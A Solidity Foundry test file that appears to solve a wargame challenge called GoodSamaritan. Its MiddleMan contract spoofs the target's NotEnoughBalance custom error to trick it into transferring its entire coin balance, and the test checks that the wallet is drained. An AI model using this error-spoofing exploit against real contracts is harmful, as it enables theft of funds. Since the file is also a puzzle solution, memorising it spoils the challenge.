// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GoodSamaritan.sol";

// when amount == 10, revert custom error
contract MiddleMan is INotifyable {
    error NotEnoughBalance();

    function attack(address prey) public returns (bool) {
        return GoodSamaritan(prey).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanTest is Test {
    GoodSamaritan instance;

    function setUp() public {
        instance = new GoodSamaritan();
        // instance = GoodSamaritan(vm.envAddress("GOOD_SAMARITAN"));
    }

    function test() public {
        assertEq(Coin(instance.coin()).balances(address(instance.wallet())), 10 ** 6);

        MiddleMan middleMan = new MiddleMan();
        bool result = middleMan.attack(address(instance));
        assertTrue(!result);

        assertEq(Coin(instance.coin()).balances(address(instance.wallet())), 0);
        assertEq(Coin(instance.coin()).balances(address(middleMan)), 10 ** 6);
    }
}
